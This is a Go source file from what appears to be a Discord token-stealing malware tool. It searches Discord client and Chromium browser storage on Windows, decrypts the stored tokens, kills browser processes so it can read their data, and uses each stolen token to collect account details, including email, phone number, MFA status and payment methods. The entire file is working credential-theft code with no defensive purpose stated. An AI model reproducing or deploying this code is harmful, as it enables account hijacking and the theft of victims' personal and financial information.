package main

import (
	"os"
	"regexp"
	"strings"
	"time"
)

var (
	AppDataPath      = os.Getenv("APPDATA")
	LocalAppDataPath = os.Getenv("LOCALAPPDATA")
)

var (
	DiscordClientPaths = map[string]string{
		"Discord":        AppDataPath + `\Discord\Local Storage\leveldb`,
		"Discord Canary": AppDataPath + `\discordcanary\Local Storage\leveldb`,
		"Discord PTB":    AppDataPath + `\discordptb\Local Storage\leveldb`,
		"Lightcord":      AppDataPath + `\Lightcord\Local Storage\leveldb`,
		"Vesktop":        AppDataPath + `\Vesktop\Local Storage\leveldb`,
		"Equibop":        AppDataPath + `\Equibop\Local Storage\leveldb`,
	}
	WebTokenRegex       = regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{38}`)
	EncryptedTokenRegex = regexp.MustCompile(`dQw4w9WgXcQ:[^"]*`)
	// "<token>": "<source browser or client>"
	encryptedTokensList = map[string]string{}
	rawTokensList       = map[string]string{}
)

type DiscordAccountResult struct {
	ID          string
	Username    string
	GlobalName  *string
	Bio         *string
	Email       string
	Phone       *string
	Token       string
	Badges      []string
	Flags       int
	AvatarURL   string
	HasMFA      bool
	NitroType   int
	NitroEndsAt *time.Time
	FoundIn     string
	// RareFriends is true if the account has any rare friends (Staff, Bug Hunter, Early Supporter, HypeSquad Events, Verified Bot Developer)
	HasRareFriends    bool
	HasPaymentMethods bool
	PaymentMethods    []string
}

var discordAccountResults []DiscordAccountResult

// findDiscordTokens scans the given path for Discord tokens
func findDiscordTokens(path string, name string) ([]string, error) {
	encryptionKey, err := decryptKey(path + `\Local State`)
	if err != nil || encryptionKey == nil {
		return nil, err
	}
	levelDBPath := path + `\Default\Local Storage\leveldb`
	// Check if the path given is a Discord client path
	if _, err := os.Stat(levelDBPath); os.IsNotExist(err) {
		levelDBPath = path + `\Local Storage\leveldb`
		if _, err := os.Stat(levelDBPath); os.IsNotExist(err) {
			return nil, err
		}
	}

	levelDB, err := os.ReadDir(levelDBPath)
	if err != nil {
		return nil, err
	}
	for _, file := range levelDB {
		// Only process .log and .ldb files
		if file.IsDir() || !(strings.HasSuffix(file.Name(), ".log") || strings.HasSuffix(file.Name(), ".ldb")) {
			continue
		}

		data, err := os.ReadFile(levelDBPath + "\\" + file.Name())
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if len(line) == 0 {
				continue
			}

			// Find encrypted tokens
			if matches := EncryptedTokenRegex.FindAllString(line, -1); matches != nil {
				for _, encToken := range matches {
					// Decrypt the token
					parts := strings.SplitN(encToken, ":", 2)
					if len(parts) != 2 {
						continue
					}
					encValue := parts[1]
					decValue, err := decryptPassword([]byte(encValue), encryptionKey)
					if err != nil || len(decValue) == 0 {
						continue
					}
					token := string(decValue)
					if encryptedTokensList[token] == "" {
						encryptedTokensList[token] = name
					}
				}
			} else if matches := WebTokenRegex.FindAllString(line, -1); matches != nil {
				for _, token := range matches {
					if rawTokensList[token] == "" {
						rawTokensList[token] = name
					}
				}
			}
		}
	}
	return nil, nil
}

func parseDiscordFlags(flags int) []string {
	var badges []string
	if flags&1<<0 != 0 {
		badges = append(badges, "Discord Employee")
	}
	if flags&1<<1 != 0 {
		badges = append(badges, "Partnered Server Owner")
	}
	if flags&1<<2 != 0 {
		badges = append(badges, "HypeSquad Events")
	}
	if flags&1<<3 != 0 {
		badges = append(badges, "Bug Hunter Level 1")
	}
	if flags&1<<6 != 0 {
		badges = append(badges, "House Bravery")
	}
	if flags&1<<7 != 0 {
		badges = append(badges, "House Brilliance")
	}
	if flags&1<<8 != 0 {
		badges = append(badges, "House Balance")
	}
	if flags&1<<9 != 0 {
		badges = append(badges, "Early Supporter")
	}
	if flags&1<<14 != 0 {
		badges = append(badges, "Bug Hunter Level 2")
	}
	if flags&1<<17 != 0 {
		badges = append(badges, "Early Verified Bot Developer")
	}
	if flags&1<<18 != 0 {
		badges = append(badges, "Discord Certified Moderator")
	}
	return badges
}

func processDiscordToken(token, source string) (*DiscordAccountResult, error) {
	client := &DiscordClient{Token: token}
	account, err := client.UserInfo()
	if err != nil {
		return nil, err
	}
	account.FoundIn = source
	account.Badges = parseDiscordFlags(account.Flags)

	return account, nil
}

func GrabDiscordTokens() ([]DiscordAccountResult, error) {
	// Find tokens in Discord clients
	for name, path := range DiscordClientPaths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		findDiscordTokens(path, name)
	}

	_ = killBrowserProcesses()
	// Find tokens in Chromium-based browsers
	for name, path := range ChromiumBrowserPaths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		findDiscordTokens(path, name)
	}

	for token, source := range encryptedTokensList {
		handle, err := processDiscordToken(token, source)
		if err != nil {
			continue
		}
		discordAccountResults = append(discordAccountResults, *handle)
	}
	for token, source := range rawTokensList {
		handle, err := processDiscordToken(token, source)
		if err != nil {
			continue
		}
		discordAccountResults = append(discordAccountResults, *handle)
	}

	return discordAccountResults, nil
}
